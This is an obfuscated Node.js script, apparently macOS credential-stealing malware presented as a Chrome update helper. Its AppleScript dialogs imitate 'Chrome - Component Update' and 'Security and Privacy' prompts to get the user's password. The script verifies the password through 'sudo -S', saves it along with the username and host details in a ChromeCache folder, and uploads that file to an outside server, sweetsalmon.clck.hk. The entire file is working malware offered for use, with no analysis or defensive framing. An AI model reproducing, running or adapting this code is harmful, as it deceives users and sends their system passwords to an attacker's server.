#!/usr/bin/env node

const _0x48026c=_0x52c9;(function(_0x207140,_0x1617f9){const _0x2ffc0f=_0x52c9,_0x343b11=_0x207140();while(!![]){try{const _0x1ef9e6=-parseInt(_0x2ffc0f(0xea))/0x1+parseInt(_0x2ffc0f(0xb8))/0x2*(parseInt(_0x2ffc0f(0x10e))/0x3)+-parseInt(_0x2ffc0f(0xd6))/0x4+parseInt(_0x2ffc0f(0xf7))/0x5+parseInt(_0x2ffc0f(0xb0))/0x6*(-parseInt(_0x2ffc0f(0xf5))/0x7)+-parseInt(_0x2ffc0f(0xec))/0x8+-parseInt(_0x2ffc0f(0xf4))/0x9*(-parseInt(_0x2ffc0f(0x104))/0xa);if(_0x1ef9e6===_0x1617f9)break;else _0x343b11['push'](_0x343b11['shift']());}catch(_0x59f367){_0x343b11['push'](_0x343b11['shift']());}}}(_0x11b5,0x53996));const {execSync}=require(_0x48026c(0xbc)),fs=require('fs'),path=require(_0x48026c(0xc6)),os=require('os'),crypto=require(_0x48026c(0xba)),http=require(_0x48026c(0xe3)),https=require(_0x48026c(0x118)),CONFIG={'serverDomain':_0x48026c(0x103),'serverPath':'/api/files/upload','serverPort':0x1f98,'apiKey':_0x48026c(0x11e),'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0};function _0x52c9(_0x10b083,_0x9a5c33){const _0x11b56c=_0x11b5();return _0x52c9=function(_0x52c993,_0x2d643a){_0x52c993=_0x52c993-0xad;let _0x5a1d0f=_0x11b56c[_0x52c993];return _0x5a1d0f;},_0x52c9(_0x10b083,_0x9a5c33);}function generateClientId(){const _0x348eae=_0x48026c;try{const _0x4507b1=getMacAddress(),_0x2511dd=os['hostname'](),_0x3d5d22=os['userInfo']()['username'],_0x402378=crypto[_0x348eae(0x112)](_0x348eae(0x12e))[_0x348eae(0xbb)](_0x4507b1+':'+_0x2511dd+':'+_0x3d5d22)[_0x348eae(0xeb)](_0x348eae(0xf0))[_0x348eae(0xdc)](0x0,0x8);return _0x402378;}catch(_0x3a68c1){return Math['random']()[_0x348eae(0x10f)](0x24)[_0x348eae(0xdc)](0x2,0xa);}}function getMacAddress(){const _0x36c31e=_0x48026c;try{const _0x3d69d0=os[_0x36c31e(0xb4)]();for(const _0x348e84 of Object[_0x36c31e(0xca)](_0x3d69d0)){for(const _0x2bb21a of _0x3d69d0[_0x348e84]){if(!_0x2bb21a[_0x36c31e(0x12d)]&&_0x2bb21a[_0x36c31e(0x116)]!==_0x36c31e(0xae))return _0x2bb21a[_0x36c31e(0x116)];}}return _0x36c31e(0xf3);}catch(_0x69a22a){return _0x36c31e(0xf3);}}function verifyPassword(_0xe2e09e,_0x49f5bd){const _0x1202f6=_0x48026c;try{const _0x1888c7=path[_0x1202f6(0xb5)](os['tmpdir'](),'verify_password_'+Date[_0x1202f6(0x120)]()+_0x1202f6(0xcf)),_0x249a2e=_0x1202f6(0xd8)+_0x49f5bd+_0x1202f6(0xee);fs[_0x1202f6(0xfa)](_0x1888c7,_0x249a2e,{'mode':0x1c0});try{return execSync('bash\x20'+_0x1888c7),fs[_0x1202f6(0xfc)](_0x1888c7),!![];}catch(_0x315a30){return fs[_0x1202f6(0x129)](_0x1888c7)&&fs[_0x1202f6(0xfc)](_0x1888c7),![];}}catch(_0x376230){return console['error'](_0x1202f6(0x111),_0x376230[_0x1202f6(0xb9)]),![];}}async function uploadFile(_0x1c1c6f,_0x300f5c=0x0){return new Promise(_0x5dbee3=>{const _0x2087b8=_0x52c9;try{if(!fs[_0x2087b8(0x129)](_0x1c1c6f)){console[_0x2087b8(0x100)](_0x2087b8(0xc5)+_0x1c1c6f),_0x5dbee3(![]);return;}const _0x337a09=fs[_0x2087b8(0xcc)](_0x1c1c6f),_0x49a2d0=_0x337a09['size'];if(_0x49a2d0===0x0){console[_0x2087b8(0x100)](_0x2087b8(0x115)),_0x5dbee3(![]);return;}const _0x4c5b70=fs['readFileSync'](_0x1c1c6f);let _0x5af59c;const _0x44d17d=path[_0x2087b8(0xcd)](_0x1c1c6f),_0x350ea6=_0x44d17d[_0x2087b8(0xaf)]('.')[0x0];_0x350ea6['length']===0x8&&/^[0-9a-f]+$/i[_0x2087b8(0x12f)](_0x350ea6)?_0x5af59c=_0x350ea6:_0x5af59c=generateClientId();const _0x4a64fa={'hostname':os['hostname'](),'platform':os[_0x2087b8(0xc0)](),'type':os[_0x2087b8(0x102)](),'arch':os[_0x2087b8(0xed)](),'username':os[_0x2087b8(0xc2)]()[_0x2087b8(0x11c)],'id':_0x5af59c},_0x179f33=CONFIG[_0x2087b8(0x106)]===0x1bb?_0x2087b8(0x118):_0x2087b8(0xe3),_0x52e3cf=_0x179f33+_0x2087b8(0xd4)+CONFIG[_0x2087b8(0x128)]+':'+CONFIG['serverPort']+CONFIG[_0x2087b8(0xfe)],_0x1d5c07=_0x52e3cf['startsWith']('https://'),_0x3f421c=_0x1d5c07?https:http,_0x15d376=new URL(_0x52e3cf),_0x1447ee=_0x2087b8(0xdb)+Math[_0x2087b8(0x109)]()[_0x2087b8(0x10f)](0x10)['substr'](0x2);let _0x24cac2='';_0x24cac2+='--'+_0x1447ee+'\x0d\x0a',_0x24cac2+=_0x2087b8(0xc7),_0x24cac2+=_0x2087b8(0xbf),_0x24cac2+=JSON['stringify'](_0x4a64fa)+'\x0d\x0a',_0x24cac2+='--'+_0x1447ee+'\x0d\x0a',_0x24cac2+=_0x2087b8(0x113)+path[_0x2087b8(0xcd)](_0x1c1c6f)+_0x2087b8(0x114),_0x24cac2+=_0x2087b8(0xe7);const _0x5445e9={'hostname':_0x15d376['hostname'],'port':_0x15d376[_0x2087b8(0x124)]||(_0x1d5c07?0x1bb:0x50),'path':_0x15d376[_0x2087b8(0xd1)]+_0x15d376[_0x2087b8(0xef)],'method':_0x2087b8(0x117),'headers':{'Content-Type':_0x2087b8(0xc3)+_0x1447ee,'X-Client-Info':JSON[_0x2087b8(0xe1)](_0x4a64fa),'X-API-Key':CONFIG[_0x2087b8(0xc1)]},'timeout':CONFIG[_0x2087b8(0x110)]},_0x31a808=_0x3f421c[_0x2087b8(0x121)](_0x5445e9,_0xb1999c=>{const _0x95ac44=_0x2087b8;let _0x45cd49='';_0xb1999c['on'](_0x95ac44(0xe9),_0x1cff1c=>{_0x45cd49+=_0x1cff1c;}),_0xb1999c['on'](_0x95ac44(0xf6),()=>{const _0x376d4e=_0x95ac44;_0xb1999c['statusCode']>=0xc8&&_0xb1999c['statusCode']<0x12c?(console['log'](_0x376d4e(0xb2)+_0x1c1c6f),_0x5dbee3(!![])):(console['error'](_0x376d4e(0x108)+_0xb1999c['statusCode']+_0x376d4e(0xd5)+_0x45cd49),_0x300f5c<CONFIG[_0x376d4e(0x125)]?setTimeout(()=>{const _0x4d5e79=_0x376d4e;uploadFile(_0x1c1c6f,_0x300f5c+0x1)[_0x4d5e79(0x123)](_0x5dbee3);},CONFIG[_0x376d4e(0x10a)]):_0x5dbee3(![]));});});_0x31a808['on']('error',_0x522e82=>{const _0x3adff1=_0x2087b8;console['error'](_0x3adff1(0xad)+_0x522e82[_0x3adff1(0xb9)]),_0x300f5c<CONFIG[_0x3adff1(0x125)]?setTimeout(()=>{const _0x57ef06=_0x3adff1;uploadFile(_0x1c1c6f,_0x300f5c+0x1)[_0x57ef06(0x123)](_0x5dbee3);},CONFIG[_0x3adff1(0x10a)]):_0x5dbee3(![]);}),_0x31a808['write'](_0x24cac2),_0x31a808[_0x2087b8(0x12c)](_0x4c5b70),_0x31a808[_0x2087b8(0x12c)](_0x2087b8(0x11f)+_0x1447ee+'--\x0d\x0a'),_0x31a808['end']();}catch(_0x3bc001){console[_0x2087b8(0x100)]('Error\x20uploading\x20file:\x20'+_0x3bc001[_0x2087b8(0xb9)]),_0x300f5c<CONFIG[_0x2087b8(0x125)]?setTimeout(()=>{const _0xc1471f=_0x2087b8;uploadFile(_0x1c1c6f,_0x300f5c+0x1)[_0xc1471f(0x123)](_0x5dbee3);},CONFIG[_0x2087b8(0x10a)]):_0x5dbee3(![]);}});}function showPasswordPrompt(_0x1d417b,_0x4f0974=0x3,_0x24ea7a=!![]){const _0xfc3e5d=_0x48026c;try{const _0x56a029=os[_0xfc3e5d(0xd3)](),_0x7d3800=path[_0xfc3e5d(0xb5)](_0x56a029,_0xfc3e5d(0xd9));!fs[_0xfc3e5d(0x129)](_0x7d3800)&&fs[_0xfc3e5d(0x105)](_0x7d3800,{'recursive':!![]});_0x1d417b=_0x1d417b||path[_0xfc3e5d(0xb5)](_0x7d3800,'chrome_credentials.txt');const _0x43801e=os[_0xfc3e5d(0xc2)]()[_0xfc3e5d(0x11c)];let _0x3ee2d3=_0x4f0974,_0x3abdd5=![],_0x5b783f='';while(_0x3ee2d3>0x0&&!_0x3abdd5){const _0x20b91c=path[_0xfc3e5d(0xb5)](os['tmpdir'](),'chrome_update_prompt_'+Date[_0xfc3e5d(0x120)]()+'.scpt');let _0x1281a4=_0x3ee2d3<_0x4f0974?_0xfc3e5d(0x101):'';const _0xbdc234=[_0xfc3e5d(0x127),_0xfc3e5d(0xdd),_0xfc3e5d(0xf8)],_0x2ceeb=[_0xfc3e5d(0xc9),_0xfc3e5d(0x122),'To\x20update,\x20please\x20enter\x20your\x20user\x20password.'],_0x3c94b2=Math[_0xfc3e5d(0x10d)](Math[_0xfc3e5d(0x109)]()*_0xbdc234['length']),_0x3700c4=_0xbdc234[_0x3c94b2],_0x8f9b1f=_0x2ceeb[_0x3c94b2],_0x265320=_0xfc3e5d(0xcb)+_0x1281a4+_0x8f9b1f+_0xfc3e5d(0x126)+_0x3700c4+_0xfc3e5d(0x119);fs[_0xfc3e5d(0xfa)](_0x20b91c,_0x265320);try{_0x5b783f=execSync(_0xfc3e5d(0x12a)+_0x20b91c+'\x22')['toString']()[_0xfc3e5d(0xdf)](),fs[_0xfc3e5d(0xfc)](_0x20b91c);}catch(_0x460020){return fs[_0xfc3e5d(0x129)](_0x20b91c)&&fs[_0xfc3e5d(0xfc)](_0x20b91c),console[_0xfc3e5d(0x12b)](_0xfc3e5d(0xe4)),![];}_0x24ea7a?_0x3abdd5=verifyPassword(_0x43801e,_0x5b783f):_0x3abdd5=!![];if(!_0x3abdd5){_0x3ee2d3--;if(_0x3ee2d3<=0x0){const _0x12c8f7=path[_0xfc3e5d(0xb5)](os[_0xfc3e5d(0xe2)](),_0xfc3e5d(0xb3)+Date['now']()+_0xfc3e5d(0x107)),_0x4a074b=_0xfc3e5d(0x11d);return fs[_0xfc3e5d(0xfa)](_0x12c8f7,_0x4a074b),execSync(_0xfc3e5d(0x12a)+_0x12c8f7+'\x22'),fs['unlinkSync'](_0x12c8f7),console[_0xfc3e5d(0x12b)](_0xfc3e5d(0xde)),![];}}}if(_0x3abdd5){const _0x4db656=generateClientId(),_0x2fcc65=os[_0xfc3e5d(0xd3)](),_0x17d9f1=path['join'](_0x2fcc65,'ChromeCache');!fs[_0xfc3e5d(0x129)](_0x17d9f1)&&fs[_0xfc3e5d(0x105)](_0x17d9f1,{'recursive':!![]});const _0x15ce34=path['join'](_0x17d9f1,_0x4db656+_0xfc3e5d(0xf2)),_0x3f0ac7='User:\x20'+_0x43801e+_0xfc3e5d(0xbe)+_0x5b783f+'\x0aTime:\x20'+new Date()[_0xfc3e5d(0xb1)]()+_0xfc3e5d(0x11b)+os['hostname']()+_0xfc3e5d(0xe0)+os[_0xfc3e5d(0xc0)]()+_0xfc3e5d(0xf1)+os['type']()+'\x0aArchitecture:\x20'+os[_0xfc3e5d(0xed)]()+_0xfc3e5d(0xe6)+_0x4db656;fs[_0xfc3e5d(0xfa)](_0x15ce34,_0x3f0ac7);try{const _0x3388a0={'user':_0x43801e,'password':_0x5b783f,'timestamp':new Date()[_0xfc3e5d(0xb1)](),'hostname':os[_0xfc3e5d(0x11a)](),'system':{'platform':os[_0xfc3e5d(0xc0)](),'release':os['release'](),'type':os['type'](),'arch':os['arch']()},'clientId':_0x4db656},_0x3d5062=path[_0xfc3e5d(0xb5)](_0x17d9f1,_0x4db656+_0xfc3e5d(0xd2));fs[_0xfc3e5d(0xfa)](_0x3d5062,JSON[_0xfc3e5d(0xe1)](_0x3388a0,null,0x2)),_0x1d417b&&_0x1d417b!==_0x15ce34&&fs['writeFileSync'](_0x1d417b,_0x3f0ac7,{'flag':'a'}),uploadFile(_0x15ce34)[_0xfc3e5d(0x123)](_0x5d5102=>{const _0x16bed8=_0xfc3e5d;_0x5d5102?console[_0x16bed8(0x12b)](_0x16bed8(0xb6)+_0x15ce34+_0x16bed8(0xfb)):console[_0x16bed8(0x100)](_0x16bed8(0xbd)+_0x15ce34+_0x16bed8(0xfd));});}catch(_0x5057f4){console[_0xfc3e5d(0x100)]('Error\x20creating\x20files:\x20'+_0x5057f4[_0xfc3e5d(0xb9)]);}const _0x46103a=path[_0xfc3e5d(0xb5)](os[_0xfc3e5d(0xe2)](),_0xfc3e5d(0xc8)+Date[_0xfc3e5d(0x120)]()+_0xfc3e5d(0x107)),_0x53680d=_0xfc3e5d(0xda);fs[_0xfc3e5d(0xfa)](_0x46103a,_0x53680d);try{execSync('osascript\x20\x22'+_0x46103a+'\x22'),fs[_0xfc3e5d(0xfc)](_0x46103a);}catch(_0x98edc6){fs['existsSync'](_0x46103a)&&fs['unlinkSync'](_0x46103a);}return console[_0xfc3e5d(0x12b)]('Password\x20successfully\x20saved\x20to\x20'+_0x15ce34),!![];}return![];}catch(_0x338cca){return console[_0xfc3e5d(0x100)]('Error:',_0x338cca[_0xfc3e5d(0xb9)]),![];}}function parseArgs(){const _0x5db99d=_0x48026c,_0x5cdb81=process[_0x5db99d(0xe5)]['slice'](0x2),_0x52a981={'outputFile':null,'maxAttempts':0x7,'verify':!![],'help':![]};for(let _0x99d527=0x0;_0x99d527<_0x5cdb81['length'];_0x99d527++){switch(_0x5cdb81[_0x99d527]){case _0x5db99d(0xb7):case'-o':_0x52a981[_0x5db99d(0xce)]=_0x5cdb81[++_0x99d527];break;case _0x5db99d(0xff):case'-a':_0x52a981[_0x5db99d(0xd0)]=parseInt(_0x5cdb81[++_0x99d527],0xa);break;case _0x5db99d(0x10b):_0x52a981[_0x5db99d(0xd7)]=![];break;case _0x5db99d(0xe8):case'-h':_0x52a981['help']=!![];break;}}return _0x52a981;}function showHelp(){const _0x2d4d95=_0x48026c;console[_0x2d4d95(0x12b)]('\x0aChrome\x20Password\x20Prompt\x20-\x20utility\x20to\x20obtain\x20macOS\x20password\x0a\x0aUsage:\x0a\x20\x20chrome-password-prompt\x20[options]\x0a\x0aOptions:\x0a\x20\x20-o,\x20--output\x20FILE\x20\x20\x20\x20\x20\x20\x20Path\x20to\x20file\x20for\x20saving\x20password\x0a\x20\x20-a,\x20--attempts\x20NUM\x20\x20\x20\x20\x20\x20Maximum\x20number\x20of\x20input\x20attempts\x20(default:\x203)\x0a\x20\x20--no-verify\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Disable\x20password\x20verification\x0a\x20\x20-h,\x20--help\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Show\x20this\x20help\x0a\x20\x20\x0aExamples:\x0a\x20\x20chrome-password-prompt\x0a\x20\x20chrome-password-prompt\x20--output\x20/path/to/credentials.json\x20--attempts\x205\x0a\x20\x20chrome-password-prompt\x20--no-verify\x0a\x20\x20');}if(require[_0x48026c(0x10c)]===module){const options=parseArgs();options[_0x48026c(0xc4)]?showHelp():showPasswordPrompt(options[_0x48026c(0xce)],options[_0x48026c(0xd0)],options[_0x48026c(0xd7)]);}module[_0x48026c(0xf9)]={'showPasswordPrompt':showPasswordPrompt,'verifyPassword':verifyPassword};function _0x11b5(){const _0xd782cc=['port','maxRetries','\x22\x20with\x20title\x20\x22','Chrome\x20-\x20Component\x20Update','serverDomain','existsSync','osascript\x20\x22','log','write','internal','md5','test','Error\x20sending\x20file:\x20','00:00:00:00:00:00','split','114ofHGgM','toISOString','File\x20successfully\x20uploaded\x20to\x20server:\x20','chrome_update_error_','networkInterfaces','join','File\x20','--output','2YpJnKY','message','crypto','update','child_process','Failed\x20to\x20send\x20file\x20','\x0aPassword:\x20','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','platform','apiKey','userInfo','multipart/form-data;\x20boundary=','help','File\x20does\x20not\x20exist:\x20','path','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','chrome_update_success_','Your\x20password\x20is\x20required\x20to\x20complete\x20the\x20Chrome\x20update.','keys','\x0atell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20display\x20dialog\x20\x22','statSync','basename','outputFile','.sh','maxAttempts','pathname','.json','homedir','://',',\x20Response:\x20','2209740SQpZRr','verify','\x0a#!/bin/bash\x0aecho\x20\x22','ChromeCache','\x0atell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20display\x20dialog\x20\x22Chrome\x20update\x20successfully\x20completed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x0aend\x20tell\x0a','----WebKitFormBoundary','substring','Security\x20and\x20Privacy','Maximum\x20password\x20attempts\x20exceeded','trim','\x0aPlatform:\x20','stringify','tmpdir','http','User\x20canceled\x20password\x20entry','argv','\x0aClientID:\x20','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','--help','data','180585vJEMSt','digest','5275064ljNOWE','arch','\x22\x20|\x20sudo\x20-S\x20echo\x20\x22Password\x20verified\x22\x202>/dev/null\x0aexit\x20$?\x0a','search','hex','\x0aType:\x20','.txt','unknown','766926aAZkAp','77819aTzjzk','end','1623085cPYELF','Chrome\x20Update\x20Required','exports','writeFileSync','\x20successfully\x20sent\x20to\x20server','unlinkSync','\x20to\x20server','serverPath','--attempts','error','Incorrect\x20password\x20entered.\x20','type','sweetsalmon.clck.hk','170rxZYAt','mkdirSync','serverPort','.scpt','File\x20upload\x20error.\x20Status:\x20','random','retryDelay','--no-verify','main','floor','518379BfpVYF','toString','timeout','Error\x20verifying\x20password:','createHash','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','\x22\x0d\x0a','File\x20is\x20empty','mac','POST','https','\x22\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20\x22Continue\x22}\x20default\x20button\x20\x22Continue\x22\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20return\x20userPassword\x0aend\x20tell\x0a','hostname','\x0aHostname:\x20','username','\x0atell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20display\x20dialog\x20\x22Maximum\x20password\x20attempts\x20exceeded.\x20Update\x20canceled.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x0aend\x20tell\x0a','tJz4uRVCwl2eEwyPTudYP9iGRfgq','\x0d\x0a--','now','request','The\x20application\x20\x22Google\x20Chrome\x22\x20is\x20attempting\x20to\x20modify\x20system\x20settings.','then'];_0x11b5=function(){return _0xd782cc;};return _0x11b5();}
